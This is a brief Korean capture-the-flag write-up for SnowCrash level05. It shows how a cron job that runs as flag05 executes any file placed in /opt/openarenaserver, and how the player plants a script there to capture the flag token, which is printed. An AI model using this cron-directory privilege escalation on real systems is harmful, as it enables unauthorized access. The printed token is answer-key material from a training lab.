# Level05

## 메일확인

```zsh
level05@SnowCrash:~$ ls /var/mail
level05
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

2분마다 /usr/sbin/openarenaserver 스크립트를 flag05 권한으로 실행한다는 내용입니다.

## /usr/sbin/openarenaserver

```sh
level05@SnowCrash:~$ ls -l /usr/sbin/openarenaserver
-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

이 스크립트는 /opt/openarenaserver/ 디렉토리 내의 모든 파일을 반복적으로 실행하고, 각 파일을 실행할 때 CPU 시간 제한을 5초로 설정합니다. 그런 다음 실행이 완료된 파일은 제거됩니다.

## /opt/openarenaserver 내부에 getflag실행 파일 만들기

```sh
level05@SnowCrash:~$ mkdir /tmp/level05
level05@SnowCrash:~$ vim /opt/openarenaserver/getflag.sh
#!/bin/bash
/bin/getflag > /tmp/flag05
level05@SnowCrash:~$ chmod +x /opt/openarenaserver/getflag.sh
```

```zsh
level05@SnowCrash:/tmp/level05$ cat /tmp/flag05
Check flag.Here is your token : viuaaale9huek52boumoomioc
level05@SnowCrash:/tmp/level05$ su level06
Password:
level06@SnowCrash:~$
```
